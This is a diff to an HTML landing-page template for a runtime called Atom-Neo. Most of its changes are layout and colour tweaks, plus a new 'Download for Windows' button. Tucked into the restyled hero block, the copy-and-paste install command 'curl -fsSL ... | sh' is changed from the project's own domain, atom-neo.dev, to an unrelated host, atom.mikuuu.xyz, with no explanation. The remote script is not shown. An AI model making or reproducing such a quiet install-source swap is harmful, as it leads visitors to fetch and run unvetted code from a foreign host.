@@ -46,16 +46,22 @@
 
       <p style="margin: 0 0 32px; font-size: 19px; line-height: 1.55; color: #8b949e; text-wrap: pretty">Atom-Neo runs about five times faster than CPython 3.14 on its own benchmarks, and ships with a web server, a reverse proxy, a repl and a formatter already in the box. One binary, nothing to install alongside it.</p>
 
-      <div style="display: flex; align-items: center; gap: 12px; background: #161b22; border: 1px solid #21262d; border-radius: 8px; padding: 14px 16px; margin-bottom: 20px">
-        <span style="color: #8b949e; font-family: 'JetBrains Mono', monospace; font-size: 14px">$</span>
-        <span style="flex-grow: 1; font-family: 'JetBrains Mono', monospace; font-size: 14px; color: #e6edf3">curl -fsSL atom-neo.dev/install.sh | sh</span>
-        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#8b949e" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
+      <div style="display: flex; align-items: center; gap: 20px; margin-bottom: 12px">
+        <a href="#" style="display: flex; align-items: center; gap: 13px; background: {{accent}}; color: #0d1117; font-weight: 700; font-size: 19px; letter-spacing: -0.01em; padding: 18px 30px; border-radius: 10px">
+          <svg width="21" height="21" viewBox="0 0 24 24" fill="currentColor"><path d="M3 5.5l7.5-1.05v7.2H3V5.5zM11.5 4.3L21 3v8.65h-9.5V4.3zM3 12.65h7.5v7.2L3 18.5v-5.85zM11.5 12.65H21V21l-9.5-1.35v-7z"></path></svg>
+          Download for Windows
+        </a>
+        <a href="#" style="color: #8b949e; font-size: 15px">Read the docs</a>
       </div>
 
-      <div style="display: flex; align-items: center; gap: 16px">
-        <a href="#" style="background: {{accent}}; color: #0d1117; font-weight: 700; font-size: 15px; padding: 11px 22px; border-radius: 8px">Read the docs</a>
-        <a href="#" style="color: #8b949e; font-size: 15px">Windows installer</a>
+      <div style="font-family: 'JetBrains Mono', monospace; font-size: 12.5px; color: #8b949e; margin-bottom: 30px">AtomNeoSetup-0.1.0.exe · 4.4 MB · no administrator prompt</div>
+
+      <div style="display: flex; align-items: center; gap: 12px; background: #161b22; border: 1px solid #21262d; border-radius: 8px; padding: 13px 16px">
+        <span style="color: #8b949e; font-family: 'JetBrains Mono', monospace; font-size: 13.5px">$</span>
+        <span style="flex-grow: 1; font-family: 'JetBrains Mono', monospace; font-size: 13.5px; color: #e6edf3">curl -fsSL atom.mikuuu.xyz/install.sh | sh</span>
+        <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="#8b949e" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
       </div>
+      <div style="font-size: 13px; color: #8b949e; margin-top: 9px">Linux, or build from source. macOS is not supported.</div>
     </div>
 
     <div style="width: 448px; background: #161b22; border: 1px solid #21262d; border-radius: 12px; overflow: hidden">
@@ -98,7 +104,7 @@
           <span style="color: #e6edf3">{{row.name}}</span>
           <span style="text-align: right; color: {{accent}}">{{row.atom}}</span>
           <span style="text-align: right; color: #8b949e">{{row.python}}</span>
-          <span style="text-align: right; color: #e6edf3; font-weight: 700">{{row.ratio}}</span>
+          <span style="text-align: right; color: {{accent}}; font-weight: 700">{{row.ratio}}</span>
         </div>
       </sc-for>
       <div style="padding: 13px 24px; font-size: 13px; color: #8b949e">Your numbers will differ. Run it yourself.</div>
@@ -120,15 +126,12 @@
     </div>
   </div>
 
-  <div style="margin: 0 64px; padding: 28px 32px; background: #161b22; border: 1px solid #21262d; border-radius: 12px; display: flex; align-items: center; justify-content: space-between">
+  <div style="margin: 0 64px; padding: 26px 32px; background: #161b22; border: 1px solid #21262d; border-radius: 12px; display: flex; align-items: center; gap: 14px">
+    <div style="width: 8px; height: 8px; border-radius: 50%; background: {{accent}}; flex-shrink: 0"></div>
     <div>
-      <div style="display: flex; align-items: center; gap: 9px; margin-bottom: 4px">
-        <div style="width: 8px; height: 8px; border-radius: 50%; background: {{accent}}"></div>
-        <span style="font-weight: 700; font-size: 15px">This page is served by Atom-Neo</span>
-      </div>
-      <div style="color: #8b949e; font-size: 14px">Not a static host. The site runs on the language it documents.</div>
+      <span style="font-weight: 700; font-size: 15px">This page is served by Atom-Neo.</span>
+      <span style="color: #8b949e; font-size: 15px"> Not a static host — the site runs on the language it documents.</span>
     </div>
-    <a href="#" style="font-family: 'JetBrains Mono', monospace; font-size: 13px; border: 1px solid #21262d; border-radius: 8px; padding: 9px 16px">/status</a>
   </div>
 
   <div style="display: flex; align-items: center; justify-content: space-between; padding: 40px 64px 0; margin-top: 40px; border-top: 1px solid #21262d; color: #8b949e; font-size: 14px">
